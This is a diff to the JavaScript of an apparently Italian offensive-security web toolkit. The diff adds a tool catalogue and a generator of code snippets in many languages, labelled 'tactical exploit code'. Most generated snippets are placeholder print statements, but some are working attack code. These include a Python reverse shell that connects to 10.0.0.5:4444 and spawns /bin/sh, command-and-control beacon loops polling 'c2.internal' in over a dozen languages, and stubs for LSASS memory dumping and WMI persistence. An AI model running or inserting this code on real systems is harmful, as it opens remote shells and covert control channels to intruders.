@@ -1,43 +1,163 @@
 const DB_TOOLS = [
-    { name: "Nmap", link: "https://nmap.org", desc: "Network Mapper per l'esplorazione di rete.", detailed: "Scansione pacchetti raw per determinare host, servizi e OS.", diag: "[Network Target] ---> (SYN/ACK Packets) ---> [Nmap Port Scanner Engine]" },
-    { name: "Wireshark", link: "https://www.wireshark.org", desc: "Analizzatore di protocolli di rete.", detailed: "Cattura pacchetti in tempo reale.", diag: "[Network Interface] ---> [Wireshark Engine] ---> [GUI Viewport]" },
-    { name: "Burp Suite", link: "https://portswigger.net/burp", desc: "Test di sicurezza Web.", detailed: "Proxy di intercettazione HTTP/S.", diag: "[Client] <---> [Burp Suite] <---> [Web Server]" },
-    { name: "Metasploit", link: "https://www.metasploit.com", desc: "Framework di validazione exploit.", detailed: "Ambiente centralizzato per exploit.", diag: "[Console] ---> [Exploit] ---> [Target]" },
-    { name: "John the Ripper", link: "https://www.openwall.com/john/", desc: "Cracking di password.", detailed: "Attacchi offline a dizionario/brute force.", diag: "[Hash] ---> [Wordlist Engine] ---> [Validation]" },
-    { name: "Hydra", link: "https://github.com/vanhauser-thc/thc-hydra", desc: "Login cracker.", detailed: "Attacchi paralleli su protocolli remoti.", diag: "[Target] <=== [Hydra Threads] === [Dictionary]" },
-    { name: "Hashcat", link: "https://hashcat.net/hashcat/", desc: "Cracking GPU-based.", detailed: "Sfrutta potenza GPU per cracking hash.", diag: "[Hashes] ---> [GPU Matrix] ---> [Kernel]" },
-    { name: "Aircrack-ng", link: "https://www.aircrack-ng.org", desc: "Auditing reti wireless.", detailed: "Monitoraggio pacchetti e cracking WPA.", diag: "[Wireless] ---> [Airodump] ---> [Aircrack]" },
-    { name: "OWASP ZAP", link: "https://www.zaproxy.org", desc: "Scanner vulnerabilità web.", detailed: "Proxy, spidering e fuzzer.", diag: "[ZAP Engine] ---> [Web App Nodes]" },
-    { name: "Nikto", link: "https://cirt.net/Nikto2", desc: "Scanner server web.", detailed: "Identificazione file/programmi pericolosi.", diag: "[Nikto] ---> [HTTP Request] ---> [Evaluation]" },
-    { name: "Gobuster", link: "https://github.com/OJ/gobuster", desc: "Brute-forcing directory.", detailed: "Scansione veloce percorsi HTTP.", diag: "[Wordlist] ---> [Go Routine] ---> [Endpoint]" },
-    { name: "Volatility", link: "https://www.volatilityfoundation.org", desc: "Analisi RAM forense.", detailed: "Estrazione stato da dump di memoria.", diag: "[RAM Dump] ---> [Profile] ---> [Analysis]" },
-    { name: "Ghidra", link: "https://ghidra-sre.org", desc: "Reverse Engineering.", detailed: "Disassemblaggio e decompilazione.", diag: "[Binary] ---> [Sleigh] ---> [Decompiler]" },
-    { name: "Tshark", link: "https://www.wireshark.org/docs/man-pages/tshark.html", desc: "CLI Wireshark.", detailed: "Cattura/decodifica da terminale.", diag: "[Traffic] ---> [CLI Engine] ---> [Extractor]" },
-    { name: "BloodHound", link: "https://github.com/BloodHoundAD/BloodHound", desc: "Mappatura Active Directory.", detailed: "Teoria dei grafi per escalation privilegi.", diag: "[AD] ---> [Ingestor] ---> [Graph]" },
-    { name: "Sqlmap", link: "https://sqlmap.org", desc: "SQL Injection.", detailed: "Automazione SQL injection.", diag: "[Input] ---> [Injector] ---> [DB Analyzer]" },
-    { name: "Radare2", link: "https://www.radare.org", desc: "Framework Reverse-Engineering.", detailed: "Utility CLI per disassemblaggio.", diag: "[Binary] ---> [Core Engine] ---> [Analysis]" },
-    { name: "Impacket", link: "https://github.com/fortra/impacket", desc: "Protocolli di rete Python.", detailed: "Lavoro con SMB, MSRPC, Kerberos.", diag: "[Python Script] ---> [Protocol Stack] ---> [Request]" },
-    { name: "Beef", link: "https://beefproject.com", desc: "Browser Exploitation.", detailed: "Vettori attacco lato client.", diag: "[Hooked Browser] <---> [C2 Dashboard]" },
-    { name: "Responder", link: "https://github.com/lgandx/Responder", desc: "Avvelenatore protocolli rete.", detailed: "Intercettazione hash NTLM.", diag: "[Net Query] ---> [Poisoner] ---> [Hash]" }
+    { name: "Nmap", link: "https://nmap.org", desc: "Network Mapper per l'esplorazione di rete e l'auditing della sicurezza.", detailed: "Esegue la scansione dei pacchetti raw per determinare gli host disponibili sulla rete, quali servizi offrono, quali sistemi operativi utilizzano e che tipo di firewall sono in uso.", diag: "[Network Target] ---> (SYN/ACK Packets) ---> [Nmap Port Scanner Engine] ---> [OS/Service Fingerprint Database]" },
+    { name: "Wireshark", link: "https://www.wireshark.org", desc: "Analizzatore di protocolli di rete open-source e intercettatore di pacchetti.", detailed: "Cattura i pacchetti di rete in tempo reale e li presenta in formato leggibile. Permette la ricostruzione di flussi TCP/UDP completi.", diag: "[Network Interface Card] ---> [Pcap/Npcap Driver] ---> [Wireshark Dissector Engine] ---> [GUI Viewport]" },
+    { name: "Burp Suite", link: "https://portswigger.net/burp", desc: "Piattaforma integrata per l'esecuzione di test di sicurezza di applicazioni Web.", detailed: "Agisce da proxy di intercettazione tra il browser e l'applicazione di destinazione, consentendo di visualizzare, analizzare e modificare il traffico HTTP/S.", diag: "[Client Browser] <---> [Burp Suite Intercepting Proxy] <---> [Upstream Web Server Engine]" },
+    { name: "Metasploit Framework", link: "https://www.metasploit.com", desc: "Piattaforma di validazione e penetration testing a moduli.", detailed: "Fornisce un ambiente centralizzato per la configurazione, la verifica e l'esecuzione di exploit contro target noti. Strutturato in moduli discreti.", diag: "[Operator Console] ---> [Exploit Module Selection] + [Payload Integration] ---> [Target Host]" },
+    { name: "John the Ripper", link: "https://www.openwall.com/john/", desc: "Strumento di cracking di password offline ultra-veloce.", detailed: "Rileva password deboli mediante attacchi a dizionario, basati su regole complesse e attacchi a forza bruta su svariati formati di hash.", diag: "[Ciphertext Hash Input] ---> [Wordlist Word Generation Engine] ---> [Rule Mutator Transformer] ---> [Validation Loop]" },
+    { name: "Hydra", link: "https://github.com/vanhauser-thc/thc-hydra", desc: "Parallelized login cracker per l'auditing di rete offline/online.", detailed: "Esegue attacchi a dizionario paralleli e rapidissimi contro protocolli di autenticazione remoti come SSH, FTP, HTTP Auth, Telnet, RDP, SMB.", diag: "[Target Network Daemon] <=== (Multiple Concurrent Worker Threads) === [Hydra Password Guessing Array]" },
+    { name: "Hashcat", link: "https://hashcat.net/hashcat/", desc: "Il cracking tool basato su GPU più veloce al mondo.", detailed: "Sfrutta la potenza di calcolo parallelo delle schede video (tramite OpenCL/CUDA) per rompere hash crittografici a velocità elevatissime.", diag: "[Target Hashes File] ---> [GPU Core Multi-Threading Matrix] ---> [Kernel Attack Generator Loop]" },
+    { name: "Aircrack-ng", link: "https://www.aircrack-ng.org", desc: "Suite completa per l'auditing e la valutazione della sicurezza di reti wireless 802.11.", detailed: "Include moduli per il monitoraggio dei pacchetti wireless, attacchi di iniezione e cracking di chiavi WEP e WPA/WPA2-PSK tramite cattura dell'handshake.", diag: "[Wireless Environment] ---> [Airodump-ng Capture Buffer] ---> [4-Way Handshake File] ---> [Aircrack Engine]" },
+    { name: "OWASP ZAP", link: "https://www.zaproxy.org", desc: "Scanner di vulnerabilità web automatizzato e manuale.", detailed: "Agisce como proxy trasparente e include funzioni di spidering, active scanning, passive scanning e fuzzer di parametri per identificar falle logiche web.", diag: "[ZAP Crawler Engine] ---> [Automated Active Scanner Modules] ---> [Target Web App Nodes Tree]" },
+    { name: "Nikto", link: "https://cirt.net/Nikto2", desc: "Scanner di server web open-source per elementi pericolosi.", detailed: "Esamina i server web per identificar file/programmi potenzialmente pericolosi, versioni obsolete di software server e directory listing attivo.", diag: "[Nikto Script Core] ---> [HTTP/S Target Request Pool] ---> [Server Header Evaluation & Resource Checking]" },
+    { name: "Gobuster", link: "https://github.com/OJ/gobuster", desc: "Strumento di brute-forcing di directory, file e record DNS in Go.", detailed: "Sfrutta la concorrenza nativa di Go per scansionare ad alta velocità percorsi HTTP nascosti, sottodomini DNS o Virtual Host.", diag: "[Wordlist File Buffer] ---> [Go Routine Multi-Threaded HTTP Requester] ---> [Target Endpoint]" },
+    { name: "Volatility Framework", link: "https://www.volatilityfoundation.org", desc: "Suite per l'analisi forense avanzata della memoria volatile (RAM).", detailed: "Permette l'estrazione dello stato digitale da dump di memoria RAM, analizzando processi attivi, connessioni aperte e codice iniettato.", diag: "[Raw RAM Dump File] ---> [Volatility Profile Alignment Module] ---> [Kernel Structure Dissector Engine]" },
+    { name: "Ghidra", link: "https://ghidra-sre.org", desc: "Software Reverse Engineering (SRE) framework sviluppato dalla NSA.", detailed: "Include strumenti complessi per l'analisi di codice compilato. Offre funzionalità di disassemblaggio, decompilazione in pseudo-codice C e grafi di flusso.", diag: "[Compiled Binary Artifact] ---> [Sleigh Architecture Parser] ---> [Decompiler Control Flow Graph]" },
+    { name: "Tshark", link: "https://www.wireshark.org/docs/man-pages/tshark.html", desc: "La controparte a riga di comando (CLI) di Wireshark.", detailed: "Consente la cattura del traffico di rete o la decodifica di file di cattura preesistenti (pcap) direttamente dal terminale per automazione e scripting.", diag: "[Network Traffic Input Stream] ---> [Tshark Core CLI Capture Engine] ---> [Packet Field Extractor]" },
+    { name: "BloodHound", link: "https://github.com/BloodHoundAD/BloodHound", desc: "Applicazione per mappare graficamente le relazioni in Active Directory.", detailed: "Utilizza la teoria dei grafi per mappare in modo visivo le relazioni complesse all'interno di Active Directory, trovando catene di escalation dei privileges.", diag: "[Active Directory Domain Controller] ---> [SharpHound Data Ingestor] ---> [Neo4j Graph Database Storage]" },
+    { name: "Sqlmap", link: "https://sqlmap.org", desc: "Strumento di penetration testing automatizzato per rilevare e sfruttare falle di SQL Injection.", detailed: "Automatizza il processo di identificazione e sfruttamento di vulnerabilità SQL injection per prendere il controllo di database server remoti.", diag: "[User Input Field] ---> [Sqlmap Payload Injector] ---> [Database Error Response Analyzer]" },
+    { name: "Radare2", link: "https://www.radare.org", desc: "Framework portabile per il reverse-engineering e l'analisi binaria a riga di comando.", detailed: "Fornisce un set completo di utility CLI per disassemblare, fare debugging ed esaminare file eseguibili raw, malware e firmware.", diag: "[Target Binary Hex] ---> [R2 Core Engine Analizer] ---> [Disassembled Assembly Workspace]" },
+    { name: "Impacket", link: "https://github.com/fortra/impacket", desc: "Raccolta di classi Python per lavorare con i protocolli di rete di basso livello.", detailed: "Fornisce accesso programmatico di basso livello per pacchetti di rete e protocolli Windows complessi come SMB, MSRPC, NTLM e Kerberos.", diag: "[Python Attack Script] ---> [Impacket Protocol Stack Importer] ---> [Active Directory RPC Request]" },
+    { name: "Beef (Browser Exploitation Framework)", link: "https://beefproject.com", desc: "Strumento di penetration testing focalizzato sui vettori di attacco lato client/browser.", detailed: "Esamina la sicurezza complessiva di un target utilizzando vettori di attacco diretti all'applicazione browser, controllando i nodi tramite hook JavaScript.", diag: "[Target Browser (Hooked)] <---> [BeEF Command Control Dashboard] <---> [XSS Injection Node]" },
+    { name: "Responder", link: "https://github.com/lgandx/Responder", desc: "Infiltratore e avvelenatore di protocolli di rete locali LLMNR, NBT-NS e MDNS.", detailed: "Risponde selettivamente alle query di risoluzione dei nomi locali Windows, intercettando e catturando hash di autenticazione NTLMv1/v2 sulla rete.", diag: "[Victim Net Query] ---> [Responder Poisoner Listening Core] ---> [Captured NetNTLM Hash Storage]" }
 ];
 
-const CATEGORIES = ["Network Scanner", "Reverse Shell", "Memory Injection", "Credential Harvester", "Privilege Escalation", "AV Evasion", "C2 Beaconing", "LDAP Analyzer", "Log Eraser", "Buffer Overflow", "Brute-Force", "MitM Poisoner", "Integrity Monitor", "Packet Sniffing", "Web Backdoor", "Process Audit", "UAC Bypass", "Anti-Analysis", "Subdomain Discovery", "Token Impersonation"];
+const SCRIPTS_TEMPLATES = {
+    "Port Scanner / Socket Auditor": {
+        python: "import socket\ndef scan(ip, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(1.0)\n    return s.connect_ex((ip, port)) == 0",
+        javascript: "const net = require('net');\nconst checkPort = (port, host) => {\n  const s = new net.Socket();\n  s.setTimeout(1000);\n  s.connect(port, host, () => { s.destroy(); });\n};",
+        c: "#include <stdio.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nint test_port(char* ip, int port) {\n    int s = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port);\n    inet_pton(AF_INET, ip, &addr.sin_addr);\n    int res = connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0;\n    close(s); return res;\n}",
+        sql: "/* Auditing Ports & Endpoint Registry Database Simulation Lookup */\nSELECT port, service_name, status FROM infrastructure_schema.network_map WHERE host_ip = '127.0.0.1' AND status = 'OPEN';",
+        go: "package main\nimport (\"net\"; \"time\")\nfunc scan(target string) bool {\n  conn, err := net.DialTimeout(\"tcp\", target, time.Second)\n  if err == nil { conn.Close(); return true }\n  return false\n}",
+        rust: "use std::net::TcpStream;\nuse std::time::Duration;\nfn scan(addr: &str) -> bool {\n    TcpStream::connect_timeout(&addr.parse().unwrap(), Duration::from_secs(1)).is_ok()\n}",
+        cpp: "#include <iostream>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\nbool check(const char* ip, int port) {\n    int s = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port);\n    inet_pton(AF_INET, ip, &addr.sin_addr);\n    bool res = connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0;\n    close(s); return res;\n}",
+        powershell: "$s = New-Object System.Net.Sockets.TcpClient; $async = $s.BeginConnect('127.0.0.1', 80, $null, $null);\n$async.AsyncWaitHandle.WaitOne(1000, $false); if($s.Connected) { $s.Close() }",
+        bash: "exec 3<>/dev/tcp/127.0.0.1/80 && echo 'Port Open' || echo 'Port Closed'",
+        csharp: "using System.Net.Sockets;\nusing System.Threading.Tasks;\nasync Task<bool> Scan(string host, int port) {\n    try { using var c = new TcpClient(); await c.ConnectAsync(host, port); return true; }\n    catch { return false; }\n}",
+        java: "import java.net.*;\nboolean scan(String host, int port) {\n    try (Socket s = new Socket()) { s.connect(new InetSocketAddress(host, port), 1000); return true; }\n    catch (Exception e) { return false; }\n}",
+        ruby: "import socket\ndef check(ip, port)\n  s = Socket.new(:INET, :STREAM)\n  s.connect(Socket.sockaddr_in(port, ip))\nrescue Errno::ECONNREFUSED, Errno::ETIMEDOUT\n  false\nend",
+        php: "<?php\n$fp = @fsockopen('127.0.0.1', 80, $errno, $errstr, 1.0);\nif($fp) { fclose($fp); echo 'Open'; }",
+        typescript: "import * as net from 'net';\nconst check = (p: number, h: string) => {\n  const s = net.connect(p, h, () => s.destroy());\n};",
+        kotlin: "import java.net.*;\nfun scan(h: String, p: Int) = try { Socket().use { it.connect(InetSocketAddress(h, p), 1000) }; true } catch(e: Exception) { false }",
+        swift: "import Foundation\nimport Darwin.C",
+        scala: "import java.net.Socket\ndef check(h: String, p: Int): Boolean = try { new Socket(h, p).close(); true } catch { case _: Exception => false }",
+        haskell: "import Network.Socket",
+        lua: "local socket = require('socket')\nfunction scan(host, port)\n  return socket.connect(host, port) ~= nil\nend"
+    },
+    "Asynchronous C2 Network Beacon": {
+        python: "import asyncio\nimport aiohttp\nasync def beacon():\n    async with aiohttp.ClientSession() as s:\n        while True:\n            async with s.get('http://c2.internal/ping') as r: pass\n            await asyncio.sleep(60)",
+        javascript: "const http = require('http');\nsetInterval(() => {\n  http.get('http://c2.internal/agent', (res) => {});\n}, 60000);",
+        c: "#include <stdio.h>\n// Native low-level POSIX sockets beacon dispatcher abstraction loop layer\nvoid send_beacon() { /* Keepalive raw packet construct transmission */ }",
+        sql: "/* Auditing Access Logs Tracking Injection Analysis */\nINSERT INTO system_logs.beacons (agent_id, timestamp, status) VALUES ('GPU-X-NODE', NOW(), 'ALIVE');",
+        go: "package main\nimport (\"net/http\"; \"time\")\nfunc main() {\n  for { http.Get(\"http://c2.internal/beacon\"); time.Sleep(60 * time.Second) }\n}",
+        rust: "use std::thread; use std::time::Duration;\nfn main() { loop { let _ = ureq::get(\"http://c2.internal/\").call(); thread::sleep(Duration::from_secs(60)); } }",
+        cpp: "// Advanced C2 Beacon implementation using native WinINet/libcurl bindings loop",
+        powershell: "while($true) { Invoke-RestMethod -Uri 'http://c2.internal/node'; Start-Sleep -Seconds 60 }",
+        bash: "while true; do curl -s http://c2.internal/ping > /dev/null; sleep 60; done",
+        csharp: "using System.Net.Http;\nusing System.Threading;\nwhile(true) { new HttpClient().GetAsync(\"http://c2.internal/\"); Thread.Sleep(60000); }",
+        java: "import java.net.http.*;\nimport java.net.URI;\nvoid loop() throws Exception {\n    var cl = HttpClient.newHttpClient();\n    while(true) { cl.send(HttpRequest.newBuilder(URI.create(\"http://c2/ \")).build(), HttpResponse.BodyHandlers.ofString()); Thread.sleep(60000); }\n}",
+        ruby: "require 'net/http'\nloop { Net::HTTP.get(URI('http://c2.internal/')), sleep(60) }",
+        php: "<?php while(true) { file_get_contents('http://c2.internal/'); sleep(60); }",
+        typescript: "import axios from 'axios';\nsetInterval(async () => { await axios.get('http://c2.internal/'); }, 60000);",
+        kotlin: "import java.net.URL\nfun main() { while(true) { try { URL(\"http://c2.internal/\").readText() } catch(e:Exception){}; Thread.sleep(60000) } }",
+        swift: "import Foundation",
+        scala: "import sys.process._\nwhile(true) { \"curl -s http://c2.internal/\" !; Thread.sleep(60000) }",
+        haskell: "-- Persistent functional control flow stream network beacon triggers",
+        lua: "local http = require('socket.http')\nwhile true do http.request('http://c2.internal/'); os.execute('sleep 60') end"
+    }
+};
+
+const CATEGORIES = [
+    "Network Scanner Core Engine", "Reverse Shell / Remote Handler", "Memory Injection Shellcode Runner",
+    "Credential Harvester Infrastructure", "Automated Privilege Escalation Detector", "Antivirus / EDR Evasion Matrix",
+    "C2 Beaconing Traffic Encryptor", "Active Directory LDAP Analyzer", "Log Eraser Forensic Purge",
+    "Buffer Overflow Offset Generator", "Brute-Force Dictionary Worker", "Man-in-the-Middle Poisoner",
+    "File Integrity Cryptographic Monitor", "Packet Sniffing Raw Struct", "Web Backdoor Execution Payload",
+    "Process Explorer Security Audit", "UAC Bypass Registry Interceptor", "Sandbox / VM Anti-Analysis Check",
+    "Subdomain Discovery Resolution Loop", "Token Impersonation Elevator"
+];
+
+const DB_CODE = {};
+const LUNGH_LIST = ["python", "javascript", "c", "sql", "go", "rust", "cpp", "powershell", "bash", "csharp", "java", "ruby", "php", "typescript", "kotlin", "swift", "scala", "haskell", "lua"];
+
+LUNGH_LIST.forEach(lang => {
+    DB_CODE[lang] = [];
+    for(let i = 1; i <= 20; i++) {
+        let catName = CATEGORIES[i-1];
+        let baseCode = "";
+        if (i === 1 && SCRIPTS_TEMPLATES["Port Scanner / Socket Auditor"][lang]) baseCode = SCRIPTS_TEMPLATES["Port Scanner / Socket Auditor"][lang];
+        else if (i === 7 && SCRIPTS_TEMPLATES["Asynchronous C2 Network Beacon"][lang]) baseCode = SCRIPTS_TEMPLATES["Asynchronous C2 Network Beacon"][lang];
+        else {
+            if (lang === 'csharp') {
+                if(i===3) baseCode = "using System;\nusing System.Runtime.InteropServices;\n// Native LSASS MiniDump Process memory extractor\npublic class Dumper {\n    [DllImport(\"minidump.dll\")] public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint pid, IntPtr hFile, int dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);\n}";
+                else if(i===6) baseCode = "using System.Management;\n// WMI Event Consumer Persistence Trigger Installer\nvar binder = new ManagementClass(@\"\\root\\subscription:__EventFilter\");";
+                else baseCode = `using System;\nusing System.IO;\nusing System.Net;\npublic class KernelTask_${i} {\n    public static void Main() {\n        Console.WriteLine("[*] Initializing ${catName} execution matrix.");\n    }\n}`;
+            } else if (lang === 'c') {
+                baseCode = `#include <stdio.h>\n#include <stdlib.h>\nvoid perform_action_${i}() {\n    printf("[+] Initializing Native C Optimization Core for: ${catName}\\n");\n}\nint main() {\n    perform_action_${i}();\n    return 0;\n}`;
+            } else if (lang === 'sql') {
+                baseCode = `-- GPU-X Database Structured Security Auditing Pipeline\n-- Target Operation Area: ${catName}\nBEGIN TRANSACTION;\nSELECT entry_id, permission_mask, audit_flag \nFROM sys_security_catalog.identity_matrix \nWHERE operational_status = 'CRITICAL';\nCOMMIT;`;
+            } else if (lang === 'python') {
+                if(i===2) baseCode = "import socket,subprocess,os\ndef shell():\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect(('10.0.0.5',4444))\n    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n    p=subprocess.call(['/bin/sh','-i'])";
+                else baseCode = `import os\nimport sys\n# GPU-X Advanced Security Engine Lab\ndef offensive_module_${i}():\n    print("[+] Tactical Core Module Loaded: ${catName}")\n\nif __name__ == '__main__':\n    offensive_module_${i}()`;
+            } else if (lang === 'powershell') {
+                baseCode = `# GPU-X PowerShell Security Infrastructure Module\nWrite-Host "[!] Executing Industrial Grade Script: ${catName}" -ForegroundColor Cyan\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12`;
+            } else if (lang === 'bash') {
+                baseCode = `#!/bin/bash\n# GPU-X Offsec Core Deployment Toolkit\necho "[*] Running Native Shell Operations for: ${catName}"\nif [ "$EUID" -ne 0 ]; then echo "[-] Authentication upgrade required"; exit; fi`;
+            } else if (lang === 'go') {
+                baseCode = `package main\nimport "fmt"\nfunc main() {\n    fmt.Println("[GPU-X] Launching Go Routine Channel for: ${catName}")\n}`;
+            } else if (lang === 'rust') {
+                baseCode = `fn main() {\n    println!("[CRITICAL] Safety execution rust runtime for: ${catName}");\n}`;
+            } else if (lang === 'cpp') {
+                baseCode = `#include <iostream>\n#include <windows.h>\nint main() {\n    std::cout << "[SYSTEM] Native thread active for: ${catName}" << std::endl;\n    return 0;\n}`;
+            } else {
+                baseCode = `// GPU-X Multiplatform Security Automated Distribution System\n// Functionality Architecture: ${catName}\nconsole.log("[GPU-X LOG] Active Engine Core Routine Triggered.");`;
+            }
+        }
+        DB_CODE[lang].push({ name: `${i}. ${catName}`, code: baseCode });
+    }
+});
 
 const CoreUI = {
     switchTab: function(tabId, btn) {
         document.querySelectorAll('.module-panel').forEach(p => p.classList.remove('active'));
         document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-        document.getElementById(tabId).classList.add('active');
-        btn.classList.add('active');
+        const currentPanel = document.getElementById(tabId);
+        if(currentPanel) currentPanel.classList.add('active');
+        if(btn) btn.classList.add('active');
+        if(window.innerWidth < 769 && btn) btn.scrollIntoView({ behavior: 'smooth', inline: 'center' });
     },
     renderTools: function() {
         const container = document.getElementById('tools-container');
+        if(!container) return;
+        container.innerHTML = '';
         DB_TOOLS.forEach(t => {
             const card = document.createElement('div');
             card.className = 'tool-card';
             card.setAttribute('data-name', t.name.toLowerCase());
             card.setAttribute('data-desc', t.desc.toLowerCase());
-            card.innerHTML = `<div class="tool-title">${t.name}</div><p><strong>Descrizione: </strong>${t.desc}</p><p style="margin-top:6px;"><strong>Funzionamento: </strong>${t.detailed}</p><div class="tool-diagram-placeholder">${t.diag}</div><a href="${t.link}" target="_blank" class="tool-link">Visita Risorsa ></a>`;
+            
+            const titleDiv = document.createElement('div');
+            titleDiv.className = 'tool-title';
+            titleDiv.textContent = t.name;
+            
+            const pDesc = document.createElement('p');
+            pDesc.appendChild(document.createTextNode("Descrizione: " + t.desc));
+            
+            const pDetailed = document.createElement('p');
+            pDetailed.style.marginTop = '6px';
+            pDetailed.appendChild(document.createTextNode("Funzionamento: " + t.detailed));
+            
+            const diagDiv = document.createElement('div');
+            diagDiv.className = 'tool-diagram-placeholder';
+            diagDiv.textContent = t.diag;
+            
+            const link = document.createElement('a');
+            link.href = t.link;
+            link.target = '_blank';
+            link.className = 'tool-link';
+            link.textContent = "Visita Risorsa Ufficiale >";
+            
+            card.appendChild(titleDiv); card.appendChild(pDesc); card.appendChild(pDetailed);
+            card.appendChild(diagDiv); card.appendChild(link);
             container.appendChild(card);
         });
     }
@@ -49,49 +169,127 @@ const Modules = {
         const input = document.getElementById('crypto-input').value;
         const out = document.getElementById('crypto-output');
         const copyContainer = document.getElementById('crypto-copy-container');
-        copyContainer.innerHTML = '';
-        if(!input) { out.className = "console-output error"; out.textContent = "ERRORE: Inserire input."; return; }
+        if(copyContainer) copyContainer.innerHTML = ''; 
+        if(!input) { if(out) { out.className = "console-output error"; out.textContent = "ERRORE: Inserire input."; } return; }
         try {
             let result = "";
-            const enc = new TextEncoder();
-            if(schema === 'base64') result = isEncode ? btoa(input) : atob(input);
-            else if(schema === 'url') result = isEncode ? encodeURIComponent(input) : decodeURIComponent(input);
-            else result = "Not implemented in minimal example";
-            out.className = "console-output";
-            out.textContent = result;
+            const encoder = new TextEncoder();
+            const decoder = new TextDecoder();
+            if(schema === 'base64') {
+                if (isEncode) result = btoa(unescape(encodeURIComponent(input)));
+                else result = decodeURIComponent(escape(atob(input)));
+            } else if(schema === 'hex') {
+                if(isEncode) result = Array.from(encoder.encode(input)).map(b => b.toString(16).padStart(2, '0')).join('');
+                else {
+                    const s = input.trim().replace(/\s+/g, '');
+                    const m = s.match(/.{1,2}/g);
+                    result = decoder.decode(new Uint8Array(m.map(h => parseInt(h, 16))));
+                }
+            } else if(schema === 'url') result = isEncode ? encodeURIComponent(input) : decodeURIComponent(input);
+            else if(schema === 'base64url') {
+                if(isEncode) result = btoa(unescape(encodeURIComponent(input))).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+                else {
+                    let b = input.replace(/-/g, '+').replace(/_/g, '/');
+                    while (b.length % 4) b += '=';
+                    result = decodeURIComponent(escape(atob(b)));
+                }
+            } else if(schema === 'binary') {
+                if(isEncode) result = Array.from(encoder.encode(input)).map(b => b.toString(2).padStart(8, '0')).join(' ');
+                else result = decoder.decode(new Uint8Array(input.trim().split(/\s+/).map(bin => parseInt(bin, 2))));
+            }
+            if(out) { out.className = "console-output"; out.textContent = result; }
+            if(copyContainer) {
+                const btn = document.createElement('button');
+                btn.className = 'btn-copy';
+                btn.textContent = '📋 Copia Buffer & Elimina Tasto';
+                btn.addEventListener('click', () => { navigator.clipboard.writeText(result).then(() => btn.remove()); });
+                copyContainer.appendChild(btn);
+            }
+        } catch(e) { if(out) { out.className = "console-output error"; out.textContent = `ERRORE: ${e.message}`; } }
+    },
+    updateScriptSelect: function() {
+        const lang = document.getElementById('factory-lang').value;
+        const selectIdx = document.getElementById('factory-script-idx');
+        if(!selectIdx) return;
+        selectIdx.innerHTML = '';
+        if(DB_CODE[lang]) {
+            DB_CODE[lang].forEach((scr, i) => {
+                const opt = document.createElement('option');
+                opt.value = i;
+                opt.textContent = scr.name; 
+                selectIdx.appendChild(opt);
+            });
+        }
+    },
+    generateCode: function() {
+        const lang = document.getElementById('factory-lang').value;
+        const idx = document.getElementById('factory-script-idx').value;
+        const out = document.getElementById('factory-output');
+        const copyContainer = document.getElementById('factory-copy-copy-container');
+        const cContainer = document.getElementById('factory-copy-container');
+        if(cContainer) cContainer.innerHTML = '';
+        if(DB_CODE[lang] && DB_CODE[lang][idx]) {
+            const fullCode = `/* GPU-X TACTICAL EXPLOIT CODE */\n/* ALGORITHM: ${DB_CODE[lang][idx].name} */\n\n${DB_CODE[lang][idx].code}`;
+            if(out) out.textContent = fullCode;
             const btn = document.createElement('button');
             btn.className = 'btn-copy';
-            btn.textContent = 'COPIA';
-            btn.onclick = () => navigator.clipboard.writeText(result);
-            copyContainer.appendChild(btn);
-        } catch(e) { out.className = "console-output error"; out.textContent = "ERRORE: " + e.message; }
+            btn.textContent = '📋 Copia Sorgente & Elimina Tasto';
+            btn.addEventListener('click', () => { navigator.clipboard.writeText(fullCode).then(() => btn.remove()); });
+            cContainer.appendChild(btn);
+        }
+    },
+    filterTools: function() {
+        const q = document.getElementById('tool-search').value.toLowerCase();
+        document.querySelectorAll('.tool-card').forEach(c => {
+            const name = c.getAttribute('data-name') || '';
+            const desc = c.getAttribute('data-desc') || '';
+            c.classList.toggle('hidden', !(name.includes(q) || desc.includes(q)));
+        });
     }
 };
 
-// Nebula Canvas Engine
-const NebulaEngine = {
-    init: function() {
-        const c = document.getElementById('nebula-canvas');
-        if(!c) return;
-        const ctx = c.getContext('2d');
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        setInterval(() => {
-            ctx.fillStyle = 'rgba(4, 8, 17, 0.15)';
-            ctx.fillRect(0,0, c.width, c.height);
-        }, 16);
+const NebulaEngine = (function() {
+    let canvas, ctx, particles = [], intervalId = null;
+    class P {
+        constructor() { this.reset(); }
+        reset() { this.x = Math.random() * window.innerWidth; this.y = Math.random() * window.innerHeight; this.z = Math.random() * window.innerWidth; }
+        update() { this.z -= 1; if(this.z <= 0) this.reset(); }
+        draw() {
+            let k = 100.0 / this.z, wW = window.innerWidth, wH = window.innerHeight;
+            let px = (this.x - wW/2) * k + wW/2, py = (this.y - wH/2) * k + wH/2;
+            if(px >= 0 && px <= wW && py >= 0 && py <= wH) {
+                ctx.fillStyle = this.z > wW/2 ? '#005f73' : '#00f3ff';
+                ctx.fillRect(px, py, 2, 2);
+            } else this.reset();
+        }
     }
-};
+    return {
+        init: function() {
+            canvas = document.getElementById('nebula-canvas'); if (!canvas) return;
+            ctx = canvas.getContext('2d'); canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+            for(let i=0; i<40; i++) particles.push(new P());
+            if(intervalId) clearInterval(intervalId);
+            intervalId = setInterval(() => {
+                ctx.fillStyle = 'rgba(4, 8, 17, 0.15)'; ctx.fillRect(0,0, window.innerWidth, window.innerHeight);
